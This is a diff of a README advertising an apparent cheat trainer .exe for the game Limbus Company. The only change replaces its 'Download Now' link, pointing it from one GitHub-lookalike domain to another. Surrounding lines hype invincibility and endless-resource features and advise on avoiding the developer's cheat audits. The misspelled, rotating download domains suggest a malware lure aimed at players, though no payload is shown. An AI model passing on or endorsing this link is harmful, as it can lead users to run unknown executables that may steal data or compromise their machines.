@@ -4,7 +4,7 @@ External trainer for Limbus Company: compact .exe with dynamic pointer chains an
 
 **Solo Mirror Dungeons, offline practice, or local emulator runs exclusively**—steer clear of Walpurgis banners, leaderboards, or shared clears. Project Moon logs freak clears (SP-free WAW bosses, 1000+ lunacy hauls) for audits; anomalies risk soft-locks. Mirror your save (%localappdata%\LimbusCompany\Saved) first. No flags in private sessions early March 2026 😎.
 
-<a href="https://limnb.githubcompiller.com/" target="_blank" rel="noopener"><img src="https://t4.ftcdn.net/jpg/08/17/73/81/360_F_817738146_X3Ze6FERyH1vZhPZmv8oOPoRVwucVVKR.jpg" alt="Download Now"></a>
+<a href="https://limnb.gitget.cc/" target="_blank" rel="noopener"><img src="https://t4.ftcdn.net/jpg/08/17/73/81/360_F_817738146_X3Ze6FERyH1vZhPZmv8oOPoRVwucVVKR.jpg" alt="Download Now"></a>
 
 - God Squad Invincibility: full team no-sell clashes—survive abnormality waves, RR4 sin affinities without a scratch.
 - Endless Sanity/SP Pool: perpetual E.G.O spam—no corrosion, chain ALEPH skills through MD Infinity floors endlessly.
